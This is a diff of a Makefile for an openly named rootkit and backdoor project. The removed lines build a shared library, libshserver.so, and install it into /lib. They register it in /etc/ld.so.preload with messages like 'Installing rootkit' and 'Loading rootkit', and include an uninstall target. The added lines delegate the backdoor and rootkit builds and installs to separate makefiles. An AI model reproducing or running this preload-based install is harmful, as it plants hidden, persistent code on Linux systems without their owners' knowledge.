@@ -1,34 +1,24 @@
-CFLAGS+= -Wall -g
-LDFLAGS+= -lc -ldl -lutil
-INSTALLDIR=/lib
+MAKE = make
 
-all: config libshserver.so
+all: backdoor rootkit
 
-config:
-	@python3 config.py > const.h
+backdoor:
+	$(MAKE) -f Makefile.backdoor
 
-libshserver.so: libshserver.c etc.c
-	gcc -fPIC -g -c libshserver.c etc.c
-	gcc -fPIC -shared -Wl,-soname,libshserver.so libshserver.o etc.o $(LDFLAGS) -o libshserver.so
+rootkit:
+	$(MAKE) -f Makefile.rootkit
 
-shellserver: shellserver.c
-	gcc -o shellserver shellserver.c shell.c etc.c -lpthread
-
-install: all
-	@echo [-] Checking the installation dir $(INSTALLDIR)
-	@test -d $(INSTALLDIR) || mkdir $(INSTALLDIR)
-	@echo [-] Installing rootkit
-	@install -m 0755 libshserver.so $(INSTALLDIR)/
-	@echo [-] Loading rootkit
-	@echo $(INSTALLDIR)/libshserver.so > /etc/ld.so.preload
-	@echo [-] Done
-
-clean:
-	rm *.so *.o shellserver
+install:
+	$(MAKE) -f Makefile.backdoor install
+	$(MAKE) -f Makefile.rootkit install
 
 uninstall:
-	@echo [-] Uninstalling rootkit
-	@echo [-] Removing rootkit files
-	unlink /etc/ld.so.preload && unlink /lib/libshserver.so
-	@echo [-] Done
+	$(MAKE) -f Makefile.rootkit uninstall
+	$(MAKE) -f Makefile.backdoor uninstall
+
+clean:
+	$(MAKE) -f Makefile.backdoor clean
+	$(MAKE) -f Makefile.rootkit clean
+
+.PHONY: all backdoor rootkit install uninstall clean
 
